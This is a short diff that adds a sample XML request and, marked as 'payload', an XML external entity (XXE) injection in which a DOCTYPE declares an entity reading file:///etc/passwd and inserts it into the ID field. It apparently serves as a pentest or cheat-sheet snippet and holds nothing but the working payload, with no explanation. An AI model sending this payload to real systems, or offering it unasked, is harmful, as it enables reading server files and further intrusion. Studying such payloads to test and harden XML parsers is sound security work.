@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+    <data>
+        <ID>
+            1
+        </ID>
+    </data>
+
+-> payload:
+<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <data>
+        <ID>
+            &xxe;
+        </ID>
+    </data>
